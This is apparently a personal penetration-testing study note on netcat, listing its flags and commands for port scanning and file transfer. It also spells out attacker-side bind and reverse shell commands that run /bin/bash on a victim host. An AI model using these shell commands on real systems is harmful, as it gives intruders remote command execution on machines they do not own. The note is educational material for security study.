---
tags:
  - CyberSec/tools
---
>[!tip] nc - TCP/IP swiss army knife

```
netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable "back-end" tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.
```

| Flag | Meaning                                                                 |
| ---- | ----------------------------------------------------------------------- |
| `-l` | Listen mode (used to create a server or wait for incoming connections). |
| `-v` | Verbose output (add more `v`s for more detail, e.g., `-vv`).            |
| `-p` | Specify **local** port (used with `-l`).                                |
| `-n` | Numeric-only IP addresses (skip DNS resolution).                        |
| `-u` | Use UDP instead of TCP.                                                 |
| `-z` | Zero-I/O mode (useful for port scanning).                               |
| `-w` | Timeout for connects and final net reads (e.g., `-w 5`).                |
| `-e` | Execute a program after connection (common for reverse shells).         |

to open listener : 		`nc -nvlp [port]`
## Create a bind shell
![[Pasted image 20231220202136.png|756x425]]

 An attacker could use the `nc -lvp [port] -e /bin/bash` command in the compromised system to create a listener on port 4444 and execute (-e) the Bash shell (/bin/bash).
- This will open up a listener on the victim machine
 On the attacking system , the `nc -nv [ip] [port]` command is used to connect to the victim. Once the attacker connects to the victim, he is able to execute commands on the victim machine.

One of the challenges of using bind shells is that if the victim’s system is behind a firewall, the listening port might be blocked. However, if the victim’s system can initiate a connection to the attacking system on a given port, a reverse shell can be used to overcome this challenge.

## Create a reverse shell
![[Pasted image 20231220202147.png|759x427]] 

To create a reverse shell, you can use the `nc -lvp [port] command in the attacking system to listen to a specific port.
- this will create a listener in the Attacking System.
Then on the compromised host (the victim), you can use the `nc [ip] [port] -e /bin/bash` command to connect to the attacking system.

Once the victim system is connected to the attacking system , you can start invoking commands.

able 8-2 lists several useful Netcat commands that could be used in a penetration testing engagement.

### Useful Netcat Commands
| Command                                                                                                        | Description                                                                      |
| -------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `nc -nv <IP Address> <Port>`                                                                                   | Using Netcat to connect to a TCP port                                            |
| `nc -lvp <port>`                                                                                               | Listening on a given TCP port                                                    |
| `nc -lvp 1234 > output.txt`<br>`# Receiving system`<br>`nc -nv <IP Address> < input.txt`<br>`# Sending system` | Used to transfer a file                                                          |
| `nc -nv <IP Address> 80`<br>`GET / HTTP/1.1`                                                                   | Connecting and receiving a web page. Port 443 can be used for HTTPS connections. |
| `nc -z <IP Address> <port range>`                                                                              | Using Netcat as a port scanner                                                   |

- Additional Netcat commands and references for post-exploitation tools can be obtained from [_https://github.com/The-Art-of-Hacking/art-of-hacking_](https://github.com/The-Art-of-Hacking/art-of-hacking).